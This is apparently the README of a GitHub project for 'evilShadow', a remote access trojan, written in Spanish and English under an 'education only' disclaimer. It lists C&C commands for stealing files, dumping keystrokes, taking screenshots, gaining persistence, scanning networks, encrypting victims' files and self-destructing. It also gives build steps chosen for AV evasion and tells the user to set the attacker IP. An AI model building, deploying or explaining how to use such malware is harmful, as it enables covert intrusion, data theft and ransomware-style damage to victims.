# evilShadow

**RECUERDA**: Este repositorio es para el aprenzidaje y educación, no me hago respondable del mal uso que se le puede dar!


# Novedades

- Transformar de **.py** a **.c** 
- Autodestrucción
- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (Mejorado (en mejora)). 

# Functions
(N/A) -> Not Implemented yet
```
                Aviable Commands:

                    | [!>] search <extension> -> Search for files with named extension
                    ---------------------------------------------------------
                    | [!>] downloadDir <path> -> Download A full dir
                    ---------------------------------------------------------
                    | [!>] download <path> -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] startTask       -> Monitoring & kill tasks managers
                    ---------------------------------------------------------
                    | [!>] check           -> Check For Administrator Privileges
                    ---------------------------------------------------------
                    | [!>] sysinfo         -> Get System Information
                    ---------------------------------------------------------
                    | [!>] shell           -> Enter Shell Mode 
                    ---------------------------------------------------------
                    | [!>] av              -> Try Detect Anti-Virus
                    ---------------------------------------------------------
                    | [!>] upload <path>   -> Upload local File To Target PC
                    ---------------------------------------------------------
                    | [!>] get <url>       -> Download A File To Target PC From Any Website
                    ---------------------------------------------------------
                    | [!>] persistence     -> Try to get persistence (needed root)
                    ---------------------------------------------------------
                    | [!>] lowpersistence  -> Try to get persistence (no root)
                    ---------------------------------------------------------
                    | [!>] exec <command>  -> Exec command in no shell mode
                    ---------------------------------------------------------
                    | [!>] cryptDir <dir>  -> Crypt a full folder in target
                    ---------------------------------------------------------
                    | [!>] crypt <file>    -> Crypt a file in target
                    ---------------------------------------------------------
                    | [!>] keylog_dump     -> Dump The Keystrokes From Keylogger
                    ---------------------------------------------------------
                    | [!>] screenshot      -> Take a screenshot
                    ---------------------------------------------------------
                    | [!>] scannet         -> Scan all active hosts on target
                    ---------------------------------------------------------
                    | [!>] scanhost <host> -> Scan ports on host
                    ---------------------------------------------------------
                    | [!>] hosts           -> See hosts scanned with scannet
                    ---------------------------------------------------------
                    | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                    ---------------------------------------------------------
                    | [!>] destruction     -> Eliminate ALL and close conex
                    --------------------------------------------------------- 
                    | [!>] q               -> Suspend the conection
                    ---------------------------------------------------------
                    | [!>] exit            -> Terminate the conection
                    ---------------------------------------------------------
```

# Información
**A dia hoy (22/10/2023) este malware compilado a través de python ya es detectado por los antivirus...**

Por esa rázon: Recomendablemente: [**Compilacion C**](#c-compilation)

- C Compiler:
 
  ![image](https://github.com/an0mal1a/DarkSpecter/assets/129337574/051efa16-1ba2-4bd0-b87a-e55d3614eafa)


- Python compilers:

  ![image](https://github.com/an0mal1a/evilShadow/assets/129337574/bebf87b6-29f2-4bc7-bb69-683cb7fbc500)


   
# Requirements

- Microsoft Visual C++ 14.0 or greater
  - https://visualstudio.microsoft.com/visual-cpp-build-tools
  
    ![image](https://github.com/an0mal1a/evilShadow/assets/129337574/dcb0d725-15c4-4453-b5c4-4b295a38fedc)


- ```pip install -r requirements.txt```

# Errors:

- Si tenemos errores con las librerias (module not found):
  - ```pip install nmap_vscan_fix prompt_toolkit colorama cryptography requests pynput certifi cffi charset-normalizer idna Pillow psutil pycparser requests six urllib3 pyinstaller cython ``` 



# C Compilation (Recomended)


Vamos a ver el proceso para transformar el .py a .c y compilarlo a nivel de C con **GCC**

- **¿Por Que?**
  - La repuesta es simple, esto nos genera un binario MUCHO mas ligero y MUCHO menos detectable

El proceso es un poco complejo, pero vale la pena...

## **Linux**
  Una vez instalado los requirements de python, ejecutamos el siguiente comando para que la compilacion en C funcione correctamente

  - Requirements: `sudo apt install python3-dev build-essential python3-pip`  
  
  - Manul Compilation:

    1. Generate source .c from .py 
          
           python3 -m cython --embed -o client/connection.c client/connectionC.py
    2. Set required parameters 
    
           PYTHONLIBVER=python$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')$(python3-config --abiflags); INCLUDEPATH=$(python3 -c "import sysconfig; print(sysconfig.get_path('include'))")
    3. Compile: 
    
           gcc -Os -I$INCLUDEPATH client/connection.c -o MalwareBinLinux $(python3-config --ldflags) -l$PYTHONLIBVER

  - Automated Comilation:

        ┌──(supervisor㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/Malware/evilShadow]
        └─$ ./autoCcompile.py


## Windows

  - Requirements:
    - GCC: MinGW 64 Bits [DOWNLOAD LINK](https://github.com/brechtsanders/winlibs_mingw/releases/download/13.2.0mcf-16.0.6-11.0.1-ucrt-r2/winlibs-x86_64-mcf-seh-gcc-13.2.0-llvm-16.0.6-mingw-w64ucrt-11.0.1-r2.7z)
      
      Es necesario descargar GCC de **64bits** [Main Page](https://winlibs.com/)

![img](https://github.com/an0mal1a/evilShadow/assets/129337574/a914ecf1-cc25-4d1b-b986-a1210a817868)


  - Manual compilation:

    1. Generate source .c from .py 
    
            python -m cython --embed -o client/connection.c client/connectionC.py
    2. Compile With Parameters **POWERSHELL**

            gcc -mwindows -municode -DMS_WIN64 client\connection.c -o MalwareBinWin -L $(python -c "import os, sysconfig; print(os.path.join(sysconfig.get_path('data'), 'libs'))") -I $(python -c "import sysconfig; print(sysconfig.get_path('include'))") -l python$(python -c 'import sys; print(\".\".join(map(str, sys.version_info[:2])).replace(\".\",\"\"))')


  - Automated Compilation:

        PS D:\ProtectosPython\ETHICAL_HACKING\Malware\evilShadow> .\autoCcompile.py

# Python Compilation Code (No recomended)

### Set IP address

En el script **connection.py** en la línea **349** tenemos la línea que crea la conexión. La modificamos a la direccion ip
del atacante

-     sock.connect ( ( '127.0.0.1' ,1337) )

Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio más.

# **Compilación**

- Tenemos varias opciones: (Accedemos a la carpeta CLIENT)

  ### Automatic
    - `client>pyinstaller compilation.spec`

  ### Windows:

  - Admin Required:
  
      `client>pyinstaller --onefile --key=Ex4mpl3KeyF0rM4lWar3 --noupx --strip --noconsole --clean --uac-admin -n "NoObfusquedTest" conection.py`

  - **NO** Admin Required:
  
      `client>pyinstaller --onefile --key=Ex4mpl3KeyF0rM4lWar3 --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`

  ### Linux:
  
    `client>pyinstaller --onefile --key=Ex4mpl3KeyF0rM4lWar3 --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`


# Funciones (EXPLICACIÓN)

TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
    (av, search <ext>, startTask, check, sysinfo, persistence, lowsersistence, scanhost <host>)


  - **targets**
    - Vemos las sesiones actualmente establecidas
      - `targets`

            <* C&C *>: targets
            
                    [  SESSIONS  ]
            
            Session: 0
                ║
                ║═══► IP Address: 127.0.0.1
                ║═══► Os Guess: (ttl --> 64): Linux
                ╚═══► Source Port: 34780
            
                    [  END SESSIONS  ]


  - **search**
    - Con este comando buscamos en todo el sistema archivos con la extension deseada
      - `search pdf`
            
            <* C&C * 127.0.0.1>:  search odt
            
                [*>] Searching .odt files. This may take a while...
            
            [*>] Files find:
            
                [*>] /home/supervisor/Templates/text/document.odt
                [*>] /home/supervisor/supervisor/Templates/text/document.odt
                [*>] /etc/skel/Templates/text/document.odt


  - **download**
    - Con el comando "download" podemos descargarnos archivos de la máquina remota
      - `download /home/supervisor/Desktop/Passwords.txt`

            <* C&C * 127.0.0.1>:  download services.py
            
                [*>] File Downloaded Successfully [./DATA/127.0.0.1]
            
            <* C&C * 127.0.0.1>:  


  - **downloadDir**
    - Con el comando "downloadDir" podemos descargarnos la estructura completa de la carpeta
      - `downloadDir /home/supervisor/Desktop/UsersData`
    
            <* C&C * 127.0.0.1>:  downloadDir ./resources
            
                *> Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
            
            <* C&C * 127.0.0.1>:  


  - **startTask**
    - Con este comando pones a ejecutarse la detección de adminitradores de tareas (windows/linux)
      - ```startTask```

            <* C&C * 127.0.0.1>:  startTask
            
                [*>] Command Send Successfully
            
            <* C&C * 127.0.0.1>:  


  - **check**
    - Miramos si poseemos de privilegios de administrador
      - ``check`` 

            <* C&C * 127.0.0.1>:  check
            
                [-] User Privileges
            
            <* C&C * 127.0.0.1>:  
 
  
  - **sysinfo**
    - Este comando nos devuelve informacion del sistema usando la libreria **platform** 
      - ``sysinfo``

                          [!>] Target:  Linux

                  | Node Name: parrot
                  ----------------------------------|
                  | Kernel: 6.1.0-1parrot1-amd64
                  ----------------------------------|
                  | Version: #1 SMP PREEMPT_DYNAMIC Parrot 6.1.15-1parrot1 (2023-04-25)
                  ----------------------------------|
                  | Machine: x86_64
                  ----------------------------------|
                  | Processor: 
                  ----------------------------------|


  - **shell**
    - Entramos en modo shell
      - ``shell``

            <* C&C * 127.0.0.1>:  shell
            <* Shell * 127.0.0.1>:  


  - **av**
    - Detección de Anti-Virus (buscando entre procesos, se puede limitar segun el usuario que ejecuta el malware)
      - ``av``

            <* C&C * 127.0.0.1>:  av
        
            [!>] Info: Detecting Anti-Virus on target...
            
                [*>]  This may take a while... 
            
            [*>] No Anti-Virus Detected!


    
  - **upload**
    - Subir un archivo local a la máquina remota (recomandable: ruta completa)
      - ``upload /home/supervisor/downloads/ncat.exe``
 
            <* C&C * 127.0.0.1>:  upload requirements.txt

                [*>] File Uploaded Successfully
            
            <* C&C * 127.0.0.1>:  
   

  - **get**
    - Descargar archivos (binarios incluidos) de una URL
      - ``get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm``

            <* C&C * 127.0.0.1>:  get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm
            
                [*>] File Downloaded Successfully
             
            <* C&C * 127.0.0.1>:  


  - **persistence**
    - Trata de conseguir la persistencia completa generando un servicio en linux y añadiendo en el registro de LOCAL_MACHINE en windows
      (ROOT NEEDED / ADMIN NEEDED)
      - ``persistence``


  - **lowpersistence**
    - Trata de conseguir la persistencia de usuario, en linux genera un crontab para el usuario, en windows un entrada en el registro de USER
      - ``lowpersistence``

  
  - **exec**
    - Ejecuta comandos en no SHELL mode
      - `exec whoami`

            <* C&C * 127.0.0.1>:  exec whoami
            supervisor


  - **cryptDir**
    - Encripta todo el contenido de una carpeta (subcarpetas/archivos) (recomedado: ruta completa)
      - ``cryptDir /home/pwned/project``

            <* C&C * 127.0.0.1>:  cryptDir USERSDATA

                [*>] Dir Crypted Successfully
            
            <* C&C * 127.0.0.1>:  exec tree USERSDATA
            USERSDATA
            ├── credentials.txt
            └── SECRETS
                └── secret

  
  - **crypt**
    - Encripta 1 archivo de la victima
      - ``crypt /home/pwned/project/index.html``

            <* C&C * 127.0.0.1>:  crypt credentials
            
                [+] File Crypted Sucsessfully 
            
            <* C&C * 127.0.0.1>:  exec cat credentials
            KӞCfV)"H`3#u|~a%Mq-xy
                             U


  - **`keylog_dump`**
    - Dumpea del cliente al servidor todo el keylog que se ha ido guardando
      - ``keylog_dump``

            <* C&C * 127.0.0.1>:  keylog_dump
            
            Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
            
                [+] Recived Keylog Dump Succesfully!
            
            <* C&C * 127.0.0.1>:  
 

  - **screenshot**
    - Crea una captura de pantalla de la victima y la envia a través del socket
      - ```screenshot```

            Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
            
                [+] Screenshot Saved As 'DATA/127.0.0.1/screenshot_received-0.png'!
            
            <* C&C * 127.0.0.1>:  


  - **scannet**
    - Ejecuta un escaneo de la red local de la victima en busca de hosts activos
      - ``scannet``

            <* C&C * 127.0.0.1>:  scannet
            
            [*>] Networks Detected:
            
                ['172.18.0.0/16', '172.17.0.0/16', '192.168.131.0/24', '127.0.0.0/8', '10.12.4.0/24', '192.168.14.0/24', '192.168.237.0/24']
             
            [!>] Select Network > 192.168.131.0/24
            [*>]  Scanning Net, this may take a while
  
                [*>] HOST: 192.168.131.48
            
                [*>] HOST: 192.168.131.90
            
                [*>] HOST: 192.168.131.1
            
            <* C&C * 127.0.0.1>:  


  - **hosts**
    - Muestra los hosts detectados por *scannet*
      - ``hosts``  

          <* C&C * 127.0.0.1>:  hosts
          
              ['192.168.131.48', '192.168.131.90', '192.168.131.1'] 
          
          <* C&C * 127.0.0.1>:  

      
  - **scanhost**
    - Ejecuta un escaneo de puertos y servicios en el host mencionado
      - ``scanhost 192.168.1.1``

            <* C&C * 127.0.0.1>:  scanhost 127.0.0.1
            [*>] Wait For The results 127.0.0.1...
                
                Scaning Port : 65475/65535 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒] 99.91%
            
                [>] Open Ports: [902, 2457, 4040, 6463, 33079, 46458, 63342]
            
            [*>] Scanning service of ports. This may take a while - 127.0.0.1 - [902, 2457, 4040, 6463, 33079, 46458, 63342]


  - **q**
    - Suspend the connection
      - ``q``


  - **destruction**
    - Elimina TODOS los archivos dropeados incluido el binario, mata los subprocesos y cierra la conexión
      - ``destruction``

            <* C&C * 127.0.0.1>:  destruction


  - **exit**
    - Close the conecction